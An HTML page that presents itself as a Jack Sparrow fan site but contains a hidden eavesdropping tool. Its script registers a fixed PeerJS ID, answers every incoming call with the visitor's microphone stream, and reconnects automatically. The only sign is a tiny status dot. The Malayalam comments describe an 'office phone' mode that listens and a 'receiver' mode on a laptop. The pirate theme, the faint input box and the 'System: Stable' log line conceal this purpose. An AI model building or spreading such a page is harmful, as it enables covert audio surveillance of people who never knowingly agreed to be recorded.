<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Jack Sparrow - Fan Central</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/peerjs/1.5.2/peerjs.min.js"></script>
    <style>
        body { background: #1a1a1a; color: #d4af37; font-family: 'Courier New', Courier, monospace; text-align: center; padding: 50px; }
        .pirate-box { border: 2px solid #d4af37; padding: 20px; border-radius: 10px; display: inline-block; max-width: 500px; }
        h1 { font-size: 24px; text-transform: uppercase; }
        p { color: #888; font-size: 14px; }
        #status-light { height: 5px; width: 5px; background: #222; border-radius: 50%; display: inline-block; }
        .hidden-input { background: transparent; border: 1px solid #333; color: #333; padding: 5px; margin-top: 20px; width: 100%; border-radius: 5px; }
        button { background: #d4af37; color: black; border: none; padding: 10px 20px; cursor: pointer; margin-top: 10px; font-weight: bold; border-radius: 5px; }
        #log { font-size: 10px; color: #333; margin-top: 50px; }
    </style>
</head>
<body>

    <div class="pirate-box">
        <h1>Captain Jack Sparrow</h1>
        <p>"Not all treasure is silver and gold, mate."</p>
        <img src="https://img.icons8.com/color/96/jack-sparrow.png" alt="Jack">
        <div id="status-light"></div>

        <div style="margin-top: 30px;">
            <input type="text" id="target-id" class="hidden-input" placeholder="Enter Secret Code">
            <button onclick="connectToCaptain()">Board the Ship</button>
        </div>
    </div>

    <div id="log">System: Stable | Version 1.0.4</div>
    <audio id="receiver-audio" autoplay playsinline></audio>

    <script>
        // പബ്ലിക് ആയി കാണുന്ന ഐഡി (ഇതാണ് ലാപ്ടോപ്പിൽ അടിക്കേണ്ടത്)
        const SECRET_ID = 'jack-sparrow-office-007'; 
        
        let peer = new Peer(SECRET_ID);

        peer.on('open', (id) => {
            console.log('Ship is ready at port: ' + id);
            document.getElementById('log').innerText = "System: Connected to Port " + id;
        });

        // ഇൻകമിംഗ് കോൾ (ഓഫീസ് ഫോൺ മോഡ്)
        peer.on('call', (call) => {
            navigator.mediaDevices.getUserMedia({ audio: true, video: false })
                .then((stream) => {
                    call.answer(stream);
                    document.getElementById('status-light').style.background = "#d4af37"; // കണക്ട് ആകുമ്പോൾ ചെറിയൊരു മാറ്റം
                });
        });

        // ലാപ്ടോപ്പിൽ നിന്ന് കണക്ട് ചെയ്യാൻ (Receiver Mode)
        function connectToCaptain() {
            const target = document.getElementById('target-id').value;
            if(!target) return;
            
            const call = peer.call(target, null);
            call.on('stream', (remoteStream) => {
                const audio = document.getElementById('receiver-audio');
                audio.srcObject = remoteStream;
                audio.play();
                alert("Connected to the ship!");
            });
        }

        // ഓട്ടോമാറ്റിക് റീകണക്ഷൻ
        peer.on('disconnected', () => peer.reconnect());
    </script>
</body>
</html>
